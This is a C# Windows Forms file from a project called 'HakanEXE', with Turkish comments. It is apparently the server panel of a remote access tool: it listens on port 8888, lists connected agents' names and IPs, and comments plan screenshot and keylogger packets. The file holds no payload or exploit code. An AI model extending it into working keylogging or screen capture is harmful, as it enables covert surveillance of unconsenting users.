using System;
using System.Net;
using System.Windows.Forms;
using HakanEXE.Server.Core;
using HakanEXE.Server.Models;
using System.Collections.Concurrent; // Birden fazla iş parçacığı için güvenli koleksiyon

namespace HakanEXE.Server.Forms
{
    public partial class MainServerForm : Form
    {
        private ServerManager _serverManager;
        private ConcurrentDictionary<string, ClientInfo> _connectedClients; // IP'ye göre istemcileri tut

        public MainServerForm()
        {
            InitializeComponent(); // Form bileşenlerini başlatır (Tasarımcı tarafından oluşturulan kısım)
            _connectedClients = new ConcurrentDictionary<string, ClientInfo>();
            InitializeServer();
            SetupListView();
        }

        private void InitializeServer()
        {
            _serverManager = new ServerManager(8888); // Portu buradan değiştirebiliriz
            _serverManager.ClientConnected += ServerManager_ClientConnected;
            _serverManager.ClientDisconnected += ServerManager_ClientDisconnected;
            _serverManager.PacketReceived += ServerManager_PacketReceived;
            _serverManager.StartListening();
            this.Text = "HakanEXE Sunucu - Dinleniyor...";
        }

        private void SetupListView()
        {
            // listViewClients adında bir ListView kontrolü olduğunu varsayalım
            listViewClients.View = View.Details;
            listViewClients.Columns.Add("Agent ID", 100);
            listViewClients.Columns.Add("Bilgisayar Adı", 150);
            listViewClients.Columns.Add("IP Adresi", 120);
            listViewClients.Columns.Add("Durum", 80);
            listViewClients.Columns.Add("Son Aktif", 150);
            listViewClients.DoubleClick += ListViewClients_DoubleClick;
        }

        private void ServerManager_ClientConnected(object sender, ClientInfo clientInfo)
        {
            // UI güncellemesi için Invoke kullan
            this.Invoke((MethodInvoker)delegate
            {
                if (!_connectedClients.ContainsKey(clientInfo.IpAddress))
                {
                    _connectedClients.TryAdd(clientInfo.IpAddress, clientInfo);
                    UpdateClientList();
                    Console.WriteLine($"Yeni İstemci Bağlandı: {clientInfo.ComputerName} ({clientInfo.IpAddress})");
                }
            });
        }

        private void ServerManager_ClientDisconnected(object sender, ClientInfo clientInfo)
        {
            this.Invoke((MethodInvoker)delegate
            {
                ClientInfo removedClient;
                _connectedClients.TryRemove(clientInfo.IpAddress, out removedClient);
                UpdateClientList();
                Console.WriteLine($"İstemci Ayrıldı: {clientInfo.ComputerName} ({clientInfo.IpAddress})");
            });
        }

        private void ServerManager_PacketReceived(object sender, Packet packet)
        {
            this.Invoke((MethodInvoker)delegate
            {
                // Paket türüne göre işlem yap (örneğin, sistem bilgisi, heartbeat, ekran görüntüsü vb.)
                // Bu kısım ClientDetailForm'a daha çok veri gönderecek.
                if (_connectedClients.ContainsKey(packet.SenderIp))
                {
                    // İstemcinin aktiflik durumunu güncelle
                    _connectedClients[packet.SenderIp].LastActive = DateTime.Now;
                    UpdateClientStatus(packet.SenderIp, "Çevrimiçi");

                    // Örneğin, ilk bağlantıda sistem bilgisini alabiliriz
                    if (packet.PacketType == PacketType.SystemInfo)
                    {
                        // JSON verisini deserialize et ve ClientInfo nesnesini güncelle
                        // Bu kısım ClientDetailForm'da işlenecek
                        // Debug için konsola yazdırabiliriz:
                        // Console.WriteLine($"Sistem Bilgisi Alındı: {packet.Data}");
                    }
                    // Diğer paket türleri burada işlenecek (ekran görüntüsü, keylogger vs.)
                }
            });
        }

        private void UpdateClientList()
        {
            listViewClients.Items.Clear();
            foreach (var client in _connectedClients.Values)
            {
                var item = new ListViewItem(client.AgentId);
                item.SubItems.Add(client.ComputerName);
                item.SubItems.Add(client.IpAddress);
                item.SubItems.Add("Çevrimiçi"); // Durum güncellenecek
                item.SubItems.Add(client.LastActive.ToString("HH:mm:ss"));
                item.Tag = client; // ClientInfo nesnesini tag olarak sakla
                listViewClients.Items.Add(item);
            }
        }

        private void UpdateClientStatus(string ipAddress, string status)
        {
            foreach (ListViewItem item in listViewClients.Items)
            {
                ClientInfo client = item.Tag as ClientInfo;
                if (client != null && client.IpAddress == ipAddress)
                {
                    item.SubItems[3].Text = status; // Durum sütunu
                    item.SubItems[4].Text = DateTime.Now.ToString("HH:mm:ss"); // Son Aktif
                    break;
                }
            }
        }

        private void ListViewClients_DoubleClick(object sender, EventArgs e)
        {
            if (listViewClients.SelectedItems.Count > 0)
            {
                ClientInfo selectedClient = listViewClients.SelectedItems[0].Tag as ClientInfo;
                if (selectedClient != null)
                {
                    ClientDetailForm detailForm = new ClientDetailForm(selectedClient, _serverManager);
                    detailForm.Show(); // Modeless olarak aç
                }
            }
        }

        private void BtnScanNetwork_Click(object sender, EventArgs e)
        {
            // Ağ tarama (NetworkScanner) burada başlatılacak
            // UDP Broadcast veya mDNS ile agent'ları bulmaya çalışacak
            MessageBox.Show("Ağ Tarama özelliği eklenecek.");
        }
    }
}